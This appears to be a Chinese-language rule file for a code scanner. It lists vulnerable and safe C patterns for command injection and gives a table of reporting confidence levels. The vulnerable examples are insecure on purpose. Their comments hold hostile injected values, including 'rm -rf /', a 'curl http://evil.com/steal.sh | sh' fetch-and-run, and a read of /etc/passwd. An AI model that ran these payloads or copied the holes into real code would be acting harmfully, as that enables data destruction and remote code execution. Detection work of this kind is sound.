# Command Injection — 规则模式

## 脆弱模式 (Vulnerable Patterns)

### Pattern 1: argv 用户输入直接 system()

```c
// VULNERABLE: 命令行参数直接传入 system
int main(int argc, char *argv[]) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "ping %s", argv[1]);
    system(cmd);                  // argv[1] = "8.8.8.8; rm -rf /" → 注入成功
    return 0;
}
```

攻击向量: `./ping 8.8.8.8; rm -rf /` → 执行的命令为 `ping 8.8.8.8; rm -rf /`

### Pattern 2: getenv 环境变量传入命令

```c
// VULNERABLE: 环境变量不可信
void backup(void) {
    char cmd[512];
    const char *target = getenv("BACKUP_TARGET");
    // BACKUP_TARGET = "/var/backups; curl http://evil.com/steal.sh | sh"
    snprintf(cmd, sizeof(cmd), "tar czf backup.tar.gz %s", target);
    system(cmd);                  // 注入
}
```

### Pattern 3: 用户输入经 snprintf 拼接后执行

```c
// VULNERABLE: snprintf 拼接部分用户输入
int execute_cmd(const char *user_input) {
    char cmd[1024];
    snprintf(cmd, sizeof(cmd), "grep -r '%s' /var/log/", user_input);
    // user_input = "'; cat /etc/passwd; echo '" → 注入
    return system(cmd);
}
```

### Pattern 4: strcat/strcpy 拼接后执行

```c
// VULNERABLE: strcat 拼接不安全
void process_file(const char *filename) {
    char cmd[256] = "cat ";
    strcat(cmd, filename);
    // filename = "../../../etc/passwd; ls" → 路径遍历 + 命令注入
    system(cmd);
}
```

### Pattern 5: popen 相同风险

```c
// VULNERABLE: popen 同样经过 shell 解析
void run_query(const char *query) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "mysql -e '%s'", query);
    FILE *result = popen(cmd, "r");  // query 含 ' → 注入
    // ...
}
```

### Pattern 6: exec 系列参数来自用户输入

```c
// VULNERABLE: execlp 参数来自外部
void run_plugin(const char *plugin_name) {
    execlp(plugin_name, plugin_name, NULL);
    // 如果 plugin_name = "rm;ls"，execlp 会在 PATH 中搜索 "rm;ls"
    // 虽然不经过 shell，但可执行文件命名本身可能被利用
}

// VULNERABLE: execvp argv 来自用户
void run_with_args(const char *prog, char **user_args) {
    execvp(prog, user_args);     // 用户可控制程序和参数
}
```

## 安全模式 (Safe Patterns)

### Pattern 1: execve 参数数组（不经过 shell）

```c
// SAFE: execve 以参数数组形式传递，不启动 shell
void ping_host(const char *validated_host) {
    char *argv[] = {
        "/bin/ping",
        "-c", "4",
        validated_host,   // 仍应验证，但不经过 shell 解析
        NULL
    };
    execve("/bin/ping", argv, environ);
    // 即使 validated_host = "8.8.8.8; rm -rf /"
    // execve 将其作为单个参数传给 ping 程序，非 shell 解释
}
```

### Pattern 2: 白名单严格验证

```c
// SAFE: 白名单 + execve
static const char *allowed_commands[] = {
    "/bin/ls", "/usr/bin/uptime", "/bin/date", NULL
};

int safe_exec(const char *cmd) {
    // 白名单检查
    for (int i = 0; allowed_commands[i] != NULL; i++) {
        if (strcmp(cmd, allowed_commands[i]) == 0) {
            // 执行固定的白名单命令，不接受用户参数
            execl(cmd, cmd, NULL);
            return 0;
        }
    }
    return -1;  // 不在白名单内，拒绝执行
}
```

### Pattern 3: API 替代命令执行

```c
// SAFE: 用库 API 替代系统命令
#include <netdb.h>

// BAD: ping 命令
// snprintf(cmd, ... "ping %s", host); system(cmd);

// GOOD: 直接使用 socket API
int ping_host(const char *host) {
    struct addrinfo hints = {0}, *res;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;

    int ret = getaddrinfo(host, "80", &hints, &res);
    if (ret != 0) return -1;

    int sock = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (sock < 0) {
        freeaddrinfo(res);
        return -1;
    }

    ret = connect(sock, res->ai_addr, res->ai_addrlen);
    freeaddrinfo(res);
    close(sock);
    return ret;
}

// SAFE: 使用系统 API 替代 system("cp ...")
// BAD:  snprintf(cmd, ... "cp %s %s", src, dst); system(cmd);
// GOOD: 
#include <unistd.h>
#include <fcntl.h>
int copy_file(const char *src, const char *dst) {
    int fd_src = open(src, O_RDONLY);
    if (fd_src < 0) return -1;
    int fd_dst = open(dst, O_WRONLY | O_CREAT, 0644);
    if (fd_dst < 0) { close(fd_src); return -1; }
    // 使用 sendfile 或 read/write 进行文件复制
    // ... 不涉及 shell 执行
}
```

### Pattern 4: 输入字符集严格白名单

```c
// SAFE: 仅允许字母数字和特定安全字符
int is_safe_input(const char *input) {
    if (!input || strlen(input) == 0) return 0;
    if (strlen(input) > 64) return 0;          // 长度上限
    for (const char *p = input; *p; p++) {
        if (!isalnum(*p) && *p != '-' && *p != '_' && *p != '.') {
            return 0;  // 包含非白名单字符
        }
    }
    return 1;
}

void run_safe(const char *user) {
    if (!is_safe_input(user)) {
        fprintf(stderr, "Invalid input\n");
        return;
    }
    // 即使使用 system，此时 user 已过白名单验证
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "finger %s", user);
    system(cmd);  // user 仅含字母数字 -_ .，无注入风险
}
```

## 判定参考

| 模式 | 报告 | 置信度 |
|------|------|--------|
| system(argv[1]) 用户直接传入 | 报告 | very-high |
| system(getenv("VAR")) 环境变量传入 | 报告 | high |
| snprintf + system 部分用户输入拼接 | 报告 | high |
| system("hardcoded_string") | 不报告 | — |
| popen(user_input, "r") | 报告 | high |
| execve(argv, ...) 参数数组 | 不报告（参数已验证） | — |
| system + 白名单验证 | 报告（low confidence） | low |
